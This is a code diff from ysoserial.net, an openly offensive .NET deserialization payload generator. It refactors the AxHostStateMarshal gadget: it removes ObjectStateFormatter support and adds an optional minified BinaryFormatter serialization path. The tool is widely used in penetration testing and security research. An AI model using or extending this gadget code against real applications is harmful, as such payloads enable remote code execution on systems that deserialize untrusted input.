@@ -31,7 +31,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "LosFormatter", "NetDataContractSerializer"};
+            return new List<string> { "BinaryFormatter", "SoapFormatter", "LosFormatter", "NetDataContractSerializer"};
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
@@ -45,7 +45,6 @@ namespace ysoserial.Generators
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
-                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
             {
                 return Serialize(payloadAxHostMarshal, formatter, inputArgs);
@@ -105,13 +104,26 @@ namespace ysoserial.Generators
             SetFakePropertyBagBinary(bfPayload);
         }
 
-        public AxHostStateMarshal(object fakePropertyBagBinary)
+        public AxHostStateMarshal(object fakePropertyBagBinary, InputArgs inputArgs)
+        {
+            MemoryStream stm = new MemoryStream();
+            if (inputArgs.Minify)
+            {
+                ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter fmtLocal = new ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter();
+                fmtLocal.Serialize(stm, fakePropertyBagBinary);
+            }
+            else
+            {
+                BinaryFormatter fmt = new BinaryFormatter();
+                fmt.Serialize(stm, fakePropertyBagBinary);
+            }
+            
+            SetFakePropertyBagBinary(stm.ToArray());
+        }
+
+        public AxHostStateMarshal(object fakePropertyBagBinary):this(fakePropertyBagBinary, new InputArgs())
         {
             // This won't use anything we might have defined in ysoserial.net BinaryFormatter process (such as minification)
-            MemoryStream stm = new MemoryStream();
-            BinaryFormatter fmt = new BinaryFormatter();
-            fmt.Serialize(stm, fakePropertyBagBinary);
-            SetFakePropertyBagBinary(stm.ToArray());
         }
 
         public AxHostStateMarshal(MemoryStream ms)
